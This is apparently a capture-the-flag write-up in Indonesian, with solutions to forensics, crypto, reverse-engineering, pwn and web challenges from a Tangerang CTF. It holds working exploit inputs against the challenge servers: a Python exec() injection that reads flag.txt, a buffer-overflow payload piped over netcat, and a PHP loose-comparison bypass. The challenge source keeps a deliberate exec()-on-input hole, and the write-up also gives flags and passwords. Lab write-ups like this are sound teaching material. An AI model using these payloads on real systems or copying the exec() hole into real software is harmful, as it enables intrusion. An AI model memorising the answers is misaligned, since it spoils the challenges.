# Forensic

## Broken signature (587)

Pertama yang saya lakukan adalah melihat header dari image tersebut menggunakan bless

```sh
bless flag.png
```

Ternyata header tidak sesuai dengan format file. Saya membandingkan denga PNG normal yang saya punya

![](Pasted%20image%2020220319174935.png)

bisa dilihat header pada format file berbeda. Pada file flag terlihat "\x89\x43\x54\x46", sedangkan PNG yang normal menampilkan "\x89\x50\x4e\x47". Saya mencocokkan file header, jadi saya ganti format file flag tersebut dengan format file PNG yang benar.

Setelah itu saya membuka file flag.png tersebut. Ternyata hasilnya gelap, "it's like a hole in my heart", tapi saya tidak habis akal, karena dia sudah berformat PNG, maka saya gunakan ztag untuk mendecode flag.png

```sh
zsteg flag.png 
```

dan ini flagnya: tangerangkota{th4nks_for_rec0v3ring_me}

## Undelete (300)

Saya akan menggunakan foremost untuk mengekstrak file yang ada di disk image.

```sh
foremost disk.img
```

Kemudian kita masuk ke folder outpunya seperti berikut

```sh
cd /home/wowon/Downloads/output/zip
unzip 00000080.zip 
Archive:  00000080.zip
[00000080.zip] flag.txt password: 
```

ternyata filenya terkunci, coba kita strings disk.img nya

```
trings disk.img 
mkfs.fat
NO NAME    FAT16   
This is not a bootable disk.  Please insert a bootable floppy and
press any key to try again ... 
LAG    ZIP 
0XTXT
ASSWORDTXT 
0XTXT
AgXT
flag.txt
AgXT
flag.txt
passw0rd_a41ead
```

Terlihat strings dari passwordnya, lalu masukkan strings tersebut ke "password", makan flag.txt akan ter-ekstrak.

```sh
cat flag.txt 
tangerangkota{del3ted_fil3_rec0very}
```

## Dangled (523)

Pertama kita akan mengekstrak "dangled.zip". Setelah itu masuk ke direktori tempat kamu mengekstrak

```sh
cd dangled
```

Ok, jadi yang kita lakukan pertamakali adalah meliha git log-nya

```sh
git log
```

![](Pasted%20image%2020220320102408.png)

Nah ternyata kosong, sekarang kita coba mengintip kedirektori file log HEAD

![](Pasted%20image%2020220320103533.png)

kemudian saya cek apa yang telah dirubah pada setiap perubahan, ini mungkin akan sangat lama jika dilakukan manual, oleh karena itu saya menggunakan automasi

```python
import os
with open("/home/wowon/Downloads/dangled/.git/logs/HEAD") as f:
    list_line=f.readlines()
    list_line=[line.split()[:2] for line in list_line]
    os.chdir("/home/wowon/Downloads/dangled")
    diff=''
    for i in range(len(list_line)):
        diff+=(os.popen("git --no-pager diff "+list_line[i][0]+" "+list_line[i][1]).read())
dif=diff.split('\n')
dif=[line for line in dif if line!='']
myflag=''
for i in range(0, len(dif), 14):
    myflag+=(dif[i+6])
myflag=myflag.replace('+','')
print(myflag)
```

output:
tangerangkota{h0w_ch4os_1t_can_be_huh_1e72d0}

# Crypto

## Waktunya Mengkaesar(444)

"caesar but sus `zowkxkckx_vctaez_qmek_qnuhyh`"
Jadi kita diberikan sesuatu yang tak berbentuk, dia bilang Caesar tapi mencurigakan. Disini saya menggunakan applikasi CyberChef. Jadi saya pastinya menggunakan Caesar chiper untuk mendecode, tetapi karena tidak ada, saya menggunakan saudaranya yaitu ROT.

![](Pasted%20image%2020220319180942.png)

Saya geser-geser sampai menemukan kata "pemanasan", tapi yang lainnya tidak terbaca. Saya terus menggeser dan meggeser sampai semuanya bisa dibaca, tidak lupa saya membuka teks editor untuk mencatat kata-kata yang terchiper. Kita temukan "pemanasan_kripto_easy_dahulu", kemudian kita *wrap* denga format flagnya menjadi: tangerangkota{pemanasan_kripto_easy_dahulu}.

# Reverse Engineering

## Vault(636)

Mari kita buka filenya

```sh
chmod +x vault
./vault
```

![](Pasted%20image%2020220319194044.png)

Ok, ternyata ada passwordnya. Kalau begitu saya akan mereverseenginering aplikasinya untuk mendapatkan password ini.
Disini saya menggunakan Ghidra. Setelah masuk ke ghidra kita menuju function main()

![](Pasted%20image%2020220319104150.png)

Pada variable "iVar1" diberikan fungsi strcmp, dimana fungsi ini digunakan untuk membandingkan antara variable "local_17" dan juga "pin_code", ini akan mempengaruhi pengulangan yang ada dibawahnya, akan dieksekusi atau tidak. Jadi bisa disimpulkan bahwa variabel "pin_code" merupakan password yang dibutuhkan untuk mendapatkan flagnya.

![](Pasted%20image%2020220319194544.png)

Nah sekarang kita menemukan passwordnya, setelah kita telusuri address dari variabel "pin_code". Sekarang tinggal mendapatkan flagnya

```sh
./vault 
Enter Pin code: 427601
Correct!
Here's the flag: tangerangkota{ltr4cing_ftw}
```

Sebenarnya bisa pakai "ltrace".
# Pwn

## Kenalan Dulu Dong :) (613)

Coba kita masuk ke server

```sh
nc 103.144.22.12 1003
Masukan Angka: 123
Anda memilih:  123
Admin Memilih:  50780838
Tidak Cocok :(
```

Sudah saya coba beberapa kali, ternyata inputnya random.
Coba kita perhatikan kodenya

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import string, random


def main():
    ranges = 8
    random_number = "".join(random.SystemRandom().choices(string.digits, k=ranges))
    for i in range(ranges):
        my_input = input("Masukan Angka: ")
        exec(my_input)  # be carefull with this function
        print("Anda memilih: ", my_input)
        if my_input == random_number:
            with open("flag.txt", "r") as f:
                print(open("flag.txt", "r").read())
                baca = f.read()
                print("Flag = %s" % (baca))
                exit(1)
        else:
            print("Admin Memilih: ", random_number)
            print("Tidak Cocok :(\n")
        break


if __name__ == "__main__":
    main()

```

Didalam kode ada perintah "exec()" yang berfungsi unutuk mengeksekusi strings. Dalam masalah ini string yang dieksekusi adalah string dari variable "my_input", yang artimya kita bisa menjalankan perintah python3 di dalam "exec()".

```sh
nc 103.144.22.12 1003
Masukan Angka: print(open("flag.txt", "r").read())
tangerangkota{Welc0m3_T0_V3ry-F1rsT-TNGKOTA-CTF...:)}

Anda memilih:  print(open("flag.txt", "r").read())
Admin Memilih:  27272313
Tidak Cocok :(
```

Diatas saya menginputkan "print(open("flag.txt", "r").read())" sehingga terlihat flagnya:
tangerangkota{Welc0m3_T0_V3ry-F1rsT-TNGKOTA-CTF...:)}

## So Ez :( (636)

Mari kita buka codenya

```sh
chmod +x ez-pwn
./ez-pwn 
Masukan Angka (Max 10 digits)
123
Nope :)
```

Ok, coba buka di ghidra, setelah itu masuk ke function main()

![](Pasted%20image%2020220320063212.png)

Kita bisa lihat ada variable "hack_me" dan dia terletak di bahaw variable "buf" yang memiliki lenght 100, artinya kita bisa meng-overwrite variabel "hack_me" dengan buffer overflow.

```sh
(python -c "print 'A'*100";cat) | ./ez-pwn
Masukan Angka (Max 10 digits)
Nope :)
```

Coba kita masukkan 'A' lebih banyak lagi

```sh
(python -c "print 'A'*110";cat) | ./ez-pwn
Masukan Angka (Max 10 digits)
Hi, here is your flag: 
cat: flag.txt: No such file or directory
```

nas kita sudah bisa mereplika permasalahan di atas. Sekarang kita coba ke server CTF nya

```sh
(python -c "print 'A'*110";cat) | nc 103.144.22.12 1002
Masukan Angka (Max 10 digits)
Hi, here is your flag: 
tangerangkota{d1KerJ4iN_k3rJ44n_buT__S000000___Eeee33zzzzZZZ!!!}
```

# Web

## Kode Nuklir Rahasia (400)

```php
<?php

if (isset($_GET['kode1']) && isset($_GET['kode2'])) {
    $kode1 = $_GET['kode1'];
    $kode2 = $_GET['kode2'];

    if ($kode1 !== $kode2) {
        if ($kode1 == $kode2) {
            die("tangerangkota{ini_bukan_flagnya_ya}");
        }
    }
    die("kode salah");
} else {
    die('/?kode1=&kode2=');
}
```

Bisa dilihat dari kode yang sudah diberikan, bahwa untuk mendapatkan flagnya kita harus membypass beberapa if statement. Coba lihat if statement berikut ini

```php
if ($kode1 !== $kode2) {
        if ($kode1 == $kode2) {
```

kita haris menginputkan variable $kode1 tidak identikal dengan $kode2, danjuga harus membuatnya tidak sama dengan, bagaimana caranya...

Disini kita akan memecahkan algoritmanya denga 00 dan 0, karena kedua angka tersebut memenuhi kualifikasi di atas.
http://103.144.22.12:5002/?kode1=00&kode2=0

![](Pasted%20image%2020220320065410.png)